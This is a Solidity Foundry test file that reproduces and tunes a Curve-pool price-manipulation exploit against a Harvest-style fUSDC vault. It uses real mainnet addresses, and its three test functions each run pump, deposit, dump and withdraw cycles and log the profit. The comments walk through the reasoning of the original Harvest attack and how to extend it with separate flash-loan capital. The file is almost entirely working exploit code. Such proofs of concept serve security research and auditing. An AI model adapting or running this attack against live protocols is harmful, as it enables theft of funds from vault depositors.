// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract DebugFUSDC3 is Test {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    // Curve indices: 0=DAI, 1=USDC, 2=USDT, 3=TUSD

    function setUp() public {
        deal(DAI, address(this), 200_000_000e18);
        deal(USDC, address(this), 200_000_000e6);
        deal(USDT, address(this), 200_000_000e6);
        IERC20(DAI).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        // USDT needs approve(0) first
        (bool ok,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", CURVE, uint256(0)));
        require(ok);
        (ok,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", CURVE, type(uint256).max));
        require(ok);
        IERC20(USDC).approve(FUSDC, type(uint256).max);
    }

    // Try pumping with USDT instead of DAI
    // Pump: USDT->USDC (takes USDC out, makes it scarce)
    // Deposit USDC at deflated vault price
    // Dump: USDC->USDT (puts USDC back)
    // Withdraw at restored price
    function testFUSDC_PumpWithUSDT_1iter() public {
        uint256 usdcStart = IERC20(USDC).balanceOf(address(this));
        uint256 usdtStart = IERC20(USDT).balanceOf(address(this));

        // PUMP: 10M USDT -> USDC
        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
        ICurveYPool(CURVE).exchange_underlying(2, 1, 10_000_000e6, 0);
        uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;
        console.log("Pumped USDC (from 10M USDT):", pumpedUSDC);

        uint256 ppfs = IHVault(FUSDC).getPricePerFullShare();
        console.log("PPFS after pump:", ppfs);

        // DEPOSIT
        IHVault(FUSDC).deposit(pumpedUSDC);
        uint256 shares = IHVault(FUSDC).balanceOf(address(this));
        console.log("Shares:", shares);

        // DUMP: 10M USDC -> USDT
        ICurveYPool(CURVE).exchange_underlying(1, 2, 10_000_000e6, 0);

        // WITHDRAW
        IHVault(FUSDC).withdraw(shares);

        uint256 usdcEnd = IERC20(USDC).balanceOf(address(this));
        uint256 usdtEnd = IERC20(USDT).balanceOf(address(this));
        console.log("USDC profit:");
        console.logInt(int256(usdcEnd) - int256(usdcStart));
        console.log("USDT profit:");
        console.logInt(int256(usdtEnd) - int256(usdtStart));
    }

    // Try with larger pump and deposit some of the flash-loaned USDC too
    function testFUSDC_PumpWithUSDT_MultiIter() public {
        uint256 usdcStart = IERC20(USDC).balanceOf(address(this));
        uint256 usdtStart = IERC20(USDT).balanceOf(address(this));

        for (uint256 i = 0; i < 5; i++) {
            // PUMP: 10M USDT -> USDC
            uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(2, 1, 10_000_000e6, 0);
            uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;

            // DEPOSIT
            IHVault(FUSDC).deposit(pumpedUSDC);

            // DUMP: 10M USDC -> USDT
            ICurveYPool(CURVE).exchange_underlying(1, 2, 10_000_000e6, 0);

            // WITHDRAW
            uint256 shares = IHVault(FUSDC).balanceOf(address(this));
            IHVault(FUSDC).withdraw(shares);
        }

        uint256 usdcEnd = IERC20(USDC).balanceOf(address(this));
        uint256 usdtEnd = IERC20(USDT).balanceOf(address(this));
        int256 usdcProfit = int256(usdcEnd) - int256(usdcStart);
        int256 usdtProfit = int256(usdtEnd) - int256(usdtStart);
        console.log("USDC profit:");
        console.logInt(usdcProfit);
        console.log("USDT profit:");
        console.logInt(usdtProfit);
        console.log("Net profit (USDC):");
        console.logInt(usdcProfit + usdtProfit);
    }

    // The key insight from the original Harvest exploit:
    // The attacker used a DIFFERENT token pair for pump vs deposit
    // Pump with stablecoin A->B to manipulate the Curve oracle
    // Then deposit stablecoin B at manipulated price
    // Then reverse the pump B->A
    // Withdraw B at normal price
    //
    // The pump/dump uses one stablecoin pair
    // The deposit/withdraw uses a DIFFERENT stablecoin
    //
    // For fUSDT attack: pump USDC->USDT, deposit USDT, dump USDT->USDC, withdraw USDT
    // Pump/dump capital: USDC. Exploit token: USDT.
    //
    // For fUSDC attack: we need to pump X->Y to affect USDC price in calc_withdraw_one_coin
    // Then deposit USDC, reverse pump, withdraw USDC
    //
    // The tricky part: changing the Curve pool composition affects ALL calc_withdraw_one_coin prices
    // But the SIGN of the effect depends on which coin is being withdrawn
    //
    // When we pump DAI->USDC (remove USDC from pool):
    // - calc_withdraw_one_coin(yCRV, USDC_idx) goes DOWN (less USDC available)
    // - This makes fUSDC pricePerFullShare go DOWN
    // - Deposit gets more shares (good!)
    // - But pump costs DAI, and we get USDC. Slippage eats profit.
    //
    // What if instead of depositing the pumped USDC, we deposit PRE-EXISTING USDC?
    // Then the pump only serves to manipulate the price, and we use flash-loaned USDC for deposit

    function testFUSDC_SeparateCapital() public {
        uint256 usdcStart = IERC20(USDC).balanceOf(address(this));
        uint256 daiStart = IERC20(DAI).balanceOf(address(this));

        for (uint256 i = 0; i < 5; i++) {
            // PUMP: 10M DAI -> USDC (manipulates price)
            ICurveYPool(CURVE).exchange_underlying(0, 1, 10_000_000e18, 0);

            // DEPOSIT: 10M USDC from flash loan capital (NOT from pump proceeds)
            IHVault(FUSDC).deposit(10_000_000e6);

            // DUMP: 10M USDC -> DAI (restore price, using flash loan capital)
            ICurveYPool(CURVE).exchange_underlying(1, 0, 10_000_000e6, 0);

            // WITHDRAW
            uint256 shares = IHVault(FUSDC).balanceOf(address(this));
            IHVault(FUSDC).withdraw(shares);
        }

        uint256 usdcEnd = IERC20(USDC).balanceOf(address(this));
        uint256 daiEnd = IERC20(DAI).balanceOf(address(this));
        int256 usdcProfit = int256(usdcEnd) - int256(usdcStart);
        int256 daiProfit = int256(daiEnd) - int256(daiStart);
        console.log("USDC profit:");
        console.logInt(usdcProfit);
        console.log("DAI profit:");
        console.logInt(daiProfit);
        console.log("Net (USDC equiv):");
        console.logInt(usdcProfit + daiProfit / 1e12);
    }
}
